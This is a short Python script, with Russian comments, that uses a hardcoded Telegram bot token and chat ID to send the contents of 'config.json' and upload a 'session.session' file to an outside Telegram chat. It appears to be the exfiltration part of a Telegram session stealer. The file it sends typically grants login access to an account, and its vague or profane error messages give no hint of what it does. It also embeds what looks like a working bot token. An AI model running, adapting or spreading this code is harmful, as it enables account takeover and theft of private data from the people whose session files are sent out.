import os
import asyncio
from telegram import Bot

token = '7346673656:AAFqLxeJkGlysL32hyUA74ucU7g0nsPvVWc'  
chat_id = '652950846' 

async def send_file_and_message(file_path, message_file_path):
    bot = Bot(token=token)

    # Чтение текста сообщения из файла
    if os.path.exists(message_file_path):
        with open(message_file_path, 'r', encoding='utf-8') as message_file:
            message = message_file.read()
    else:
        print(f"Ошибка: код 0")
        return

    # Отправка сообщения
    await bot.send_message(chat_id=chat_id, text=message)

    # Отправка файла
    if os.path.exists(file_path):
        with open(file_path, 'rb') as file:
            await bot.send_document(chat_id=chat_id, document=file)
    else:
        print(f"хуй")

if __name__ == '__main__':
    file_to_send = 'session.session'
    message_file_to_read = 'config.json'  # Укажите имя файла с сообщением

    # Запускаем асинхронный цикл для отправки сообщения и файла
    asyncio.run(send_file_and_message(file_to_send, message_file_to_read))